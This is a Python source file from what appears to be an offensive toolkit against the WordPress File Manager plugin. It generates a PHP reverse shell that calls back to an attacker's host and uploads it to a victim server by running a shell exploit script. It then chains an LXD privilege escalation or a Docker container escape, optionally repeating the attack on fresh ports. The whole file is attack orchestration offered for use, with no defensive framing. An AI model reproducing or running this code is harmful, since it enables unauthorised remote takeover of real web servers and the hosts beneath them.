import os, sys
import my_reverse_shell
import requests
from datetime import datetime
from Privilege_Escalation_LXD import LXD_exploit
from DockerEscape import escape_docker
from configparser import ConfigParser 	
import create_conf

def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
	
	print('[*] Proceeding to execute the reverse shell')
	k = 1
	if arguments.repeat != None:
		k = int(arguments.repeat)
		
	config_object = ConfigParser()
	
	# Execute the script multiple times (flag -r REPEAT was used)
	for i in range (0, k):
	
		# If on Repeat mode reopen the config file to check the new port
		if arguments.repeat != None:
			config_object.read("config.ini")
			attacker_info = config_object["ATTACKERINFO"]
			victim_info = config_object["VICTIMINFO"]
			general_info = config_object["GENERALINFO"]
	
		f = open("reverse_shell.php", "w")
	

		code = my_reverse_shell.gen_reverse_shell(attacker_info)

		f.write(code)

		f.close()

		print('[+] Reverse Shell generated')

		flag = False

			

		print('[*] Executing exploit')
		
		print('[*] Sending the payload...')
		launch_exploit(attacker_info, victim_info)
		user_dir = os.getcwd()
	
			
		print('[*] (On Repeat, Attack {i} from {k}) <'.format(i=i+1, k=k), end="")
		match int(exp):
			case 1:
				print("LXD>")
				LXD_exploit.run(victim_info, attacker_info, general_info, arguments)
			case 2:
				pass
			case 3:
				print("Docker>")
				escape_docker.run(victim_info, attacker_info, general_info, arguments)
			case default:
				sys.exit("Something went wrong, invalid exploit")
		
		# Generate a new port for each attack, avoid the TIME_WAIT
		create_conf.gen_config(False)
		
def launch_exploit(attacker_info, victim_info):
	now = datetime.now()
	s = ''
	if victim_info['secure'] == True:
		s = 's'
	print('[DEBBUG] Exec => bash exploit.sh -u http' + s + '://{ip}:{port} -f {path}'.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))
	os.system('''bash exploit.sh -u http''' + s + '''://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))



